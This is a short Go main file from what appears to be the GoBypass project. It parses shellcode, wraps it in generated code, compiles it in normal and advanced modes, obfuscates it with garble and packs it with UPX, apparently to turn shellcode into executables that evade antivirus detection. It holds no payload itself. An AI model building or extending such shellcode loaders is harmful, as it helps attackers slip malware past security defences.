package main

import (
	"github.com/EmYiQing/GoBypass/build"
	"github.com/EmYiQing/GoBypass/parser"
	"github.com/EmYiQing/GoBypass/upx"
)

func main() {
	shellcode := parser.ParseShellCode()
	code := parser.GetFinalCode(shellcode)
	build.NormalBuild(code)
	build.AdvanceBuild(code)
	build.NormalGarble(code)
	build.AdvanceGarble(code)
	upx.StartUpx()
}
